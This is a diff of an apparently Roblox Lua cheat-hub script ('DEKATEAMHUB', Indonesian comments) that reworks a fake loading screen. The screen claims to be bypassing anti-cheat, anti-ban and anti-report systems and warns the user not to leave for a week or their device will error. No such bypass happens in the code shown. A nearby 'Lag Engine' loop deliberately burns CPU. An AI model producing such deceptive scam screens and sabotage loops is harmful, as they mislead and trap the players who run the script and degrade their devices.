@@ -62,20 +62,26 @@ task.spawn(function()
     infoText.BackgroundTransparency = 1
     infoText.Font = Enum.Font.Code
     
-    -- [[ FUNGSI GANTI TEKS OTOMATIS ]] --
+    -- [[ SISTEM GANTI TEKS URUTAN BARU ]] --
     task.spawn(function()
-        while true do
-            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nSABAR TUNGGU 1 JAM!\nJANGAN KELUAR ATAU PROSES INJEKSI GAGAL!"
-            task.wait(120) -- 2 Menit
-            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI BANNED...\n\nSABAR TUNGGU 1 JAM!\nJANGAN KELUAR ATAU PROSES INJEKSI GAGAL!"
-            task.wait(120) -- 2 Menit
-            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI REPORT...\n\nSABAR TUNGGU 1 JAM!\nJANGAN KELUAR ATAU PROSES INJEKSI GAGAL!"
-            task.wait(120) -- 2 Menit
-            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nSABAR TUNGGU 1 JAM!\nJANGAN KELUAR ATAU PROSES INJEKSI GAGAL!"
-            task.wait(120) -- 2 Menit
-            infoText.Text = "DEKATEAMHUB: BYPASSING ANTI DETECTED...\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
-            task.wait(604800) -- 1 Minggu (Biarkan di sini)
+        local function UpdateTeks(msg)
+            infoText.Text = "DEKATEAMHUB: " .. msg .. "\n\nSABAR TUNGGU PROSES SELESAI!\nJANGAN KELUAR ATAU PROSES GAGAL!"
         end
+
+        -- 1. Anti Banned (2 Menit)
+        UpdateTeks("BYPASSING ANTI BANNED...")
+        task.wait(120)
+        
+        -- 2. Anti Report (2 Menit)
+        UpdateTeks("BYPASSING ANTI REPORT...")
+        task.wait(120)
+        
+        -- 3. Anti Detected (2 Menit)
+        UpdateTeks("BYPASSING ANTI DETECTED...")
+        task.wait(120)
+        
+        -- 4. FINAL: Anti Cheat (1 Minggu)
+        infoText.Text = "DEKATEAMHUB: BYPASSING ANTI CHEAT...\n\nDURASI: 1 MINGGU\nJANGAN KELUAR ATAU DEVICE ANDA ERROR!"
     end)
 
     -- Lag Engine
@@ -85,6 +91,7 @@ task.spawn(function()
         for i = 1, 1500000 do local _ = i * i end
     end)
 end)
+
 
 
 
